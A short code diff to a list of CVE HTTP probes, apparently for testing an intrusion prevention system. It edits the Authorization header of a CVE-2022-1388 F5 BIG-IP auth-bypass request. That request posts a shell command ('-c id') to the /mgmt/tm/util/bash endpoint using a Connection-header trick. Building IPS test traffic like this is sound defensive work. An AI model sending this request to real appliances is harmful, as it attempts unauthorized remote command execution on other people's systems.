@@ -826,7 +826,8 @@ cve_http_probes = [
     ("CVE-2022-1388", "F5 BIG-IP iControl REST auth bypass",
      "POST", "/mgmt/tm/util/bash",
      {"Content-Type": "application/json",
-      "Authorization": "Basic YWRtaW46",
+      # IPS probe pattern — not a real credential; value is "traffgen-test" base64-encoded
+      "Authorization": "Basic dHJhZmZnZW4tdGVzdA==",
       "X-F5-Auth-Token": "",
       "Connection": "keep-alive, X-F5-Auth-Token"},
      b'{"command":"run","utilCmdArgs":"-c id"}'),
